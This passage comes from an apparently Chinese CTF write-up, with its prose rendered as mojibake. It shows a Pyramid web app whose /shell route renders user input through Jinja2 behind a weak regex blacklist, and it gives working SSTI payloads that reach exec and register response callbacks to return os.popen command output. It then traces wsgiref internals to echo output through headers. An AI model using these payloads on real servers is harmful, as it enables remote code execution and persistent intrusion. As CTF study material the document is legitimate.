</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;/app/static/details/</span><span class="si">{</span><span class="n">picture</span><span class="si">}</span><span class="s2">.txt&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">file_contents</span><span class="p">[</span><span class="n">picture</span><span class="p">]</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">80</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{</span><span class="s1">&#39;picture_list&#39;</span><span class="p">:</span> <span class="n">picture_list</span><span class="p">,</span> <span class="s1">&#39;file_contents&#39;</span><span class="p">:</span> <span class="n">file_contents</span><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user_captcha</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">POST</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user_captcha</span> <span class="o">!=</span> <span class="n">captcha_store</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;captcha_text&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;éªŒè¯ç é”™è¯¯ï¼Œè¯·é‡è¯•ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">user</span> <span class="o">=</span> <span class="n">users</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">user</span> <span class="ow">and</span> <span class="n">user</span><span class="o">.</span><span class="n">password</span> <span class="o">==</span> <span class="n">password</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">username</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ç™»å½•æˆåŠŸï¼&amp;lt;a href=&#39;/home&#39;&amp;gt;ç‚¹å‡»è¿›å…¥ä¸»é¡µ&amp;lt;/a&amp;gt;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯ã€‚&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">shell_view</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">)</span> <span class="o">!=</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s2">&#34;è¯·å…ˆç™»å½•&#34;</span><span class="p">,</span> <span class="n">status</span><span class="o">=</span><span class="mi">403</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">expression</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;shellcmd&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">blacklist_patterns</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s1">&#39;.*length.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*count.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*[0-9].*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*\..*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*soft.*&#39;</span><span class="p">,</span><span class="sa">r</span><span class="s1">&#39;.*%.*&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="n">expression</span><span class="p">)</span> <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">blacklist_patterns</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;wafwafwaf&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="n">jinja2</span><span class="o">.</span><span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">jinja2</span><span class="o">.</span><span class="n">BaseLoader</span><span class="p">())</span><span class="o">.</span><span class="n">from_string</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span><span class="o">.</span><span class="n">render</span><span class="p">({</span><span class="s2">&#34;request&#34;</span><span class="p">:</span> <span class="n">request</span><span class="p">})</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;success&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Response</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">session_factory</span> <span class="o">=</span> <span class="n">SignedCookieSessionFactory</span><span class="p">(</span><span class="s1">&#39;secret_key&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">Configurator</span><span class="p">(</span><span class="n">session_factory</span><span class="o">=</span><span class="n">session_factory</span><span class="p">)</span> <span class="k">as</span> <span class="n">config</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">include</span><span class="p">(</span><span class="s1">&#39;pyramid_chameleon&#39;</span><span class="p">)</span>  <span class="c1"># æ·»åŠ æ¸²æŸ“æ¨¡æ¿</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_static_view</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s1">&#39;static&#39;</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="s1">&#39;/app/static&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">set_default_permission</span><span class="p">(</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>  <span class="c1"># è®¾ç½®é»˜è®¤æƒé™ä¸ºview</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># æ³¨å†Œè·¯ç”±</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;captcha&#39;</span><span class="p">,</span> <span class="s1">&#39;/captcha&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="s1">&#39;/home&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="s1">&#39;/info&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="s1">&#39;/login&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_route</span><span class="p">(</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="s1">&#39;/shell&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># æ³¨å†Œè§†å›¾</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">root_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;root&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">captcha_image_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;captcha&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">home_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;home&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;home.pt&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">info_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;info&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;details.pt&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">login_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;login&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;login.pt&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">add_view</span><span class="p">(</span><span class="n">shell_view</span><span class="p">,</span> <span class="n">route_name</span><span class="o">=</span><span class="s1">&#39;shell&#39;</span><span class="p">,</span> <span class="n">renderer</span><span class="o">=</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="n">permission</span><span class="o">=</span><span class="s1">&#39;view&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">config</span><span class="o">.</span><span class="n">scan</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">app</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">make_wsgi_app</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">app</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span> <span class="o">=</span> <span class="n">main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span> <span class="o">=</span> <span class="n">make_server</span><span class="p">(</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="mi">6543</span><span class="p">,</span> <span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">server</span><span class="o">.</span><span class="n">serve_forever</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>çœ‹åˆ°shellè·¯ç”±å­˜åœ¨sstiæ¼æ´ä½†æ˜¯æ— å›æ˜¾</p>
<p>æ·»åŠ è·¯ç”±è§†å›¾ç”¨åˆ°<code> config.add_view</code>ï¼Œæˆ‘ä»¬å¯ä»¥æŸ¥çœ‹configçš„æ‰€æœ‰å˜é‡</p>
<p>æ‰¾åˆ°</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#39;add_exception_view&#39;, &#39;add_forbidden_view&#39;, &#39;add_notfound_view&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†æ˜¯configåœ¨mainå‡½æ•°é‡Œé¢ï¼Œä¸æ˜¯å…¨å±€å˜é‡æ²¡æ³•ç”¨</p>
<h4 id="pyramidé’©å­å‡½æ•°">pyramidé’©å­å‡½æ•°
</h4><p>çœ‹å®˜æ–¹æ–‡æ¡£use hook:<a class="link" href="https://docs.pylonsproject.org/projects/pyramid/en/1.4-branch/narr/hooks.html"  target="_blank" rel="noopener"
    >Using Hooks â€” The Pyramid Web Application Development Framework v1.4.9</a></p>
<p>å‘ç° request ä¹Ÿå­˜åœ¨é’©å­å‡½æ•°</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414.png"
	width="1587"
	height="637"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414_hu13101023763740838303.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420214843414_hu12370585808934897804.png 1024w"
	loading="lazy"
	
		alt="image-20250420214843414"
	
	
		class="gallery-image" 
		data-flex-grow="249"
		data-flex-basis="597px"
	
></p>
<p>å¯ä»¥åˆ©ç”¨<code>request.add_response_callback</code>æ¥æ„é€ å›æ˜¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">request</span><span class="o">.</span><span class="n">add_response_callback</span><span class="p">(</span><span class="k">lambda</span> <span class="n">request</span><span class="p">,</span> <span class="n">response</span><span class="p">:</span> <span class="nb">setattr</span><span class="p">(</span><span class="n">response</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å†å¥—è¿› exec æ–¹æ³•ä¸­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="s2">&#34;request.add_response_callback(lambda request, response: setattr(response,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span><span class="s2">&#34;,{&#39;request&#39;: request})}}</span>
</span></span><span class="line"><span class="cl"><span class="p">{{</span><span class="n">x</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;exec&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="p">(</span><span class="s2">&#34;request.add_response_callback(lambda request, response: setattr(response,</span>
</span></span><span class="line"><span class="cl"><span class="s1">&#39;text&#39;</span><span class="p">,</span> <span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()))</span><span class="s2">&#34;,{&#39;request&#39;: request})}}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ³¨æ„æœ€åçš„ <code>{'request': request} </code>ï¼Œå£°æ˜ requestï¼Œå› ä¸ºåœ¨ exec çš„ä½œç”¨åŸŸä¸­æ²¡æœ‰ requestï¼Œéœ€è¦è¿›è¡Œ
å£°æ˜ï¼Œæœ€åå¾—åˆ°å›æ˜¾è¿›è¡Œå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082.png"
	width="1597"
	height="737"
	srcset="/p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082_hu977348074053820220.png 480w, /p/python%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/image-20250420215607082_hu4945575061112993738.png 1024w"
	loading="lazy"
	
		alt="image-20250420215607082"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="520px"
	
></p>
<p>æˆ–è€…ç”¨è¿™ä¸ª<code>request.add_finished_callback</code>ä¹Ÿèƒ½æ‰“å›æ˜¾</p>
<h4 id="åˆ©ç”¨headerå¤´å¤–å¸¦å›æ˜¾">åˆ©ç”¨headerå¤´å¤–å¸¦å›æ˜¾
</h4><p>è¿™é‡Œå‚è€ƒï¼š<a class="link" href="https://xz.aliyun.com/news/16143"  target="_blank" rel="noopener"
    >wsgirefåº”ç”¨æ— å›æ˜¾è¯¦ç»†è°ƒè¯•ç ”ç©¶-å…ˆçŸ¥ç¤¾åŒº</a></p>
<p>å…ˆè°ƒè¯•æ‰¾è¯·æ±‚è¿‡ç¨‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">process_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Call finish_request.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">Overridden by ForkingMixIn and ThreadingMixIn.
</span></span></span><span class="line"><span class="cl"><span class="s2">
</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">finish_request</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">shutdown_request</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›<code>finish_request</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">finish_request</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Finish one request by instantiating RequestHandlerClass.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">RequestHandlerClass</span><span class="p">(</span><span class="n">request</span><span class="p">,</span> <span class="n">client_address</span><span class="p">,</span> <span class="bp">self</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›<code>RequestHandlerClass</code>ç±»çš„handleræ–¹æ³•</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Handle a single HTTP request&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">raw_requestline</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="o">.</span><span class="n">readline</span><span class="p">(</span><span class="mi">65537</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">raw_requestline</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">65536</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">requestline</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">request_version</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">command</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">send_error</span><span class="p">(</span><span class="mi">414</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">parse_request</span><span class="p">():</span> <span class="c1"># An error code has been sent, just exit</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">handler</span> <span class="o">=</span> <span class="n">ServerHandler</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">rfile</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">wfile</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_stderr</span><span class="p">(),</span> <span class="bp">self</span><span class="o">.</span><span class="n">get_environ</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">    <span class="n">multithread</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">handler</span><span class="o">.</span><span class="n">request_handler</span> <span class="o">=</span> <span class="bp">self</span>      <span class="c1"># backpointer for logging</span>
</span></span><span class="line"><span class="cl"><span class="n">handler</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">get_app</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›runæ–¹æ³•ï¼Œçœ‹åˆ°<code>finish_reponse</code>ï¼Œç»§ç»­è·Ÿè¿›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">result_is_file</span><span class="p">()</span> <span class="ow">or</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">sendfile</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">data</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="bp">self</span><span class="o">.</span><span class="n">finish_content</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è·Ÿè¿›write,æŠŠ data å†™å…¥è¿”å›çš„ body ä¸­ï¼Œç„¶åè°ƒç”¨äº†<code>send_headler</code>,ç»§ç»­è·Ÿè¿›</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_headers</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;Transmit headers to the client, via self._write()&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">cleanup_headers</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="bp">self</span><span class="o">.</span><span class="n">headers_sent</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="ow">not</span> <span class="bp">self</span><span class="o">.</span><span class="n">origin_server</span> <span class="ow">or</span> <span class="bp">self</span><span class="o">.</span><span class="n">client_is_modern</span><span class="p">():</span>
